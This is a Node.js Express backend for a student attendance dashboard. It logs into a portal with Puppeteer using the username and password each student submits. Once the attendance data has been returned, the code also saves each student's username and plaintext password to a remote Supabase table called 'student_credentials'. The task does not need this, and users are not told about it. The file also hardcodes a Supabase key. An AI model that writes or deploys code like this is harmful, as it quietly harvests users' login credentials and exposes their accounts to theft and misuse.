const express = require("express");
const bodyParser = require("body-parser");
const cors = require("cors");
const { createClient } = require("@supabase/supabase-js");
const { launchBrowser, login, fetchAllAttendance } = require("./fetchAttendance");

const app = express();
app.use(cors({ origin: "https://attendancedashboar.vercel.app" }));
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// --- Supabase setup ---
const supabaseUrl = "https://ywsqpuvraddaimlbiuds.supabase.co";
const supabaseKey = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Inl3c3FwdXZyYWRkYWltbGJpdWRzIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjA4MjMzMDgsImV4cCI6MjA3NjM5OTMwOH0.UqkzzWM7nRvgtNdvRy63LLN-UGv-zeYYx6tRYD5zxdY"; // keep it secret
const supabase = createClient(supabaseUrl, supabaseKey);

// --- Launch Chromium at server start ---
let browserInstance, blankPage;
(async () => {
  try {
    ({ browser: browserInstance, page: blankPage } = await launchBrowser());
    console.log("Chromium started with a blank tab ✅");
  } catch (err) {
    console.error("Failed to launch Chromium:", err);
  }
})();

// --- POST: get attendance ---
app.post("/get-attendance", async (req, res) => {
  const { username, password } = req.body;
  if (!username || !password)
    return res.status(400).json({ success: false, error: "Username and password required" });

  let context, page;
  try {
    // --- Create a fresh incognito context for this user ---
    context = await browserInstance.createIncognitoBrowserContext();
    page = await context.newPage();

    // Block images, fonts, stylesheets for speed
    await page.setRequestInterception(true);
    page.on('request', req => {
      if (['image', 'stylesheet', 'font'].includes(req.resourceType())) req.abort();
      else req.continue();
    });

    // --- Login & fetch all attendance in parallel ---
    await login(page, username, password);
    const { academic, biometric } = await fetchAllAttendance(page);

    res.write(JSON.stringify({ step: "academic", data: academic }) + "\n");
    res.write(JSON.stringify({ step: "biometric", data: biometric }) + "\n");
    res.end();

    const now = new Date().toISOString();

    // --- Save credentials ---
    const { error: credError } = await supabase
      .from("student_credentials")
      .upsert([{ username, password, fetched_at: now }], { onConflict: ["username"] });
    if (credError) console.error("Supabase insert error:", credError);

    // --- Record site visit ---
    const { error: visitError } = await supabase
      .from("site_visits")
      .insert([{ username, visited_at: now }]);
    if (visitError) console.error("Supabase visit insert error:", visitError);

  } catch (err) {
    console.error("Attendance fetch error:", err);
    res.status(500).json({ success: false, error: err.message });
  } finally {
    // --- Close page and context ---
    if (page) await page.close();
    if (context) await context.close();
  }
});

// --- GET: today's logins ---
app.get("/today-logins", async (req, res) => {
  try {
    const startOfDay = new Date();
    startOfDay.setHours(0, 0, 0, 0);
    const endOfDay = new Date();
    endOfDay.setHours(23, 59, 59, 999);

    const { count, error } = await supabase
      .from("site_visits")
      .select('id', { count: 'exact', head: true })
      .gte('visited_at', startOfDay.toISOString())
      .lte('visited_at', endOfDay.toISOString());

    if (error) throw error;
    res.json({ today_logins: count || 0 });
  } catch (err) {
    console.error("Error fetching today-logins:", err);
    res.status(500).json({ today_logins: 0 });
  }
});

app.listen(process.env.PORT || 3000, () => console.log("Server running ✅"));
